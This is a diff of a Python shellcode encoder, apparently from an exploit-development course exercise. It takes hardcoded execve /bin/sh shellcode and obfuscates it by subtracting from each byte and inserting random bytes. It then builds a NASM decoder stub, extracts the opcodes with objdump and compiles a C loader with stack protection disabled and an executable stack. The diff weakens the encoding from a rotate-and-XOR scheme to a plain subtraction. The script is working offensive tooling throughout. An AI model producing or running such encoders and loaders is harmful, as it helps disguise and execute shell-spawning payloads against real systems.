@@ -1,9 +1,16 @@
 #!/usr/bin/python
 
+# Python Insertion Encoder 
 import random
 import sys, os
 
-file_name = 'decoder'
+
+
+def ror(x, n, bits = 8):
+    mask = (2**n) - 1
+    mask_bits = x & mask
+    return (x >> n) | (mask_bits << (bits - n))
+
 
 def get_stop_code(shellcode):
 	list_codes = bytearray(shellcode)
@@ -20,19 +27,13 @@ def get_stop_code(shellcode):
 	return stop_code
 
 
-def ror(x, n, bits = 8):
-    mask = (2**n) - 1
-    mask_bits = x & mask
-    return (x >> n) | (mask_bits << (bits - n))
-
-    
 def encode_shellcode(shellcode, hex_stop_code):
 	encoded2 = ""
 	for x in bytearray(shellcode) :	
 		# Value 1: Encoded 'x'
-		y = ( ror(x,1) ^ 224 ) - 7
+		x = x - 7
 		encoded2 += '0x'
-		encoded2 += '%02x,' %y
+		encoded2 += '%02x,' %x
 		# Value 2: Random value != stop_code
 		rand_number = random.randint(1,10)
 		encoded2 += '0x%02x,' % rand_number
@@ -41,7 +42,8 @@ def encode_shellcode(shellcode, hex_stop_code):
 
 
 def create_new_file(hex_stop_code, encoded2):
-	lines = open(file_name+".nasm").read().splitlines()
+	file_name = 'decoder.nasm'
+	lines = open(file_name).read().splitlines()
 	new_file_lines = []
 	for l in lines:
 		if l.endswith("marker1"):
@@ -56,18 +58,16 @@ def create_new_file(hex_stop_code, encoded2):
 			new_file_lines.append(new_l)
 		else:
 			new_file_lines.append(l)
-	open(file_name+".nasm",'w').write('\n'.join(new_file_lines))
+	open(file_name,'w').write('\n'.join(new_file_lines))
 
-
-def compile(fname):
-	os.system("nasm -f elf32 -o "+fname+".o "+fname+".nasm")
-	os.system("ld  -m elf_i386 -o "+fname+" "+fname+".o")
-	os.system("rm "+fname+".o")
-
+def compile(file_name):
+	os.system("nasm -f elf32 -o "+file_name+".o "+file_name+".nasm")
+	os.system("ld  -m elf_i386 -o "+file_name+" "+file_name+".o")
+	os.system("rm "+file_name+".o")
 
 def create_new_file_shellcode(shellcode):
-	fname = 'shellcode.c'
-	lines = open(fname).read().splitlines()
+	file_name = 'shellcode.c'
+	lines = open(file_name).read().splitlines()
 	new_file_lines = []
 	for l in lines:
 		if l.endswith("marker3"):
@@ -77,21 +77,23 @@ def create_new_file_shellcode(shellcode):
 			new_file_lines.append(new_l)
 		else:
 			new_file_lines.append(l)
-	open(fname,'w').write('\n'.join(new_file_lines))
+	open(file_name,'w').write('\n'.join(new_file_lines))
 
 	
+
 def main():
 	shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 	stop_code = get_stop_code(shellcode)
 	hex_stop_code = '{:02X}'.format(stop_code).lower()
+	
 	encoded2 = encode_shellcode(shellcode, hex_stop_code)
 	create_new_file(hex_stop_code, encoded2)
 	
+	file_name = "decoder"
 	compile(file_name)
-	cmd = "objdump -d ./"+file_name+"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'"
+	cmd = "objdump -d ./"+file_name+"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'"
 	shellcode = os.popen(cmd).read().splitlines()[0]
-	print ("Shellcode: \n\n"+shellcode)
-	print("\n--------------------------\n")
+	print ("Shellcode: \n"+shellcode)
 	create_new_file_shellcode(shellcode)
 	os.system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode 2>/dev/null")
 	
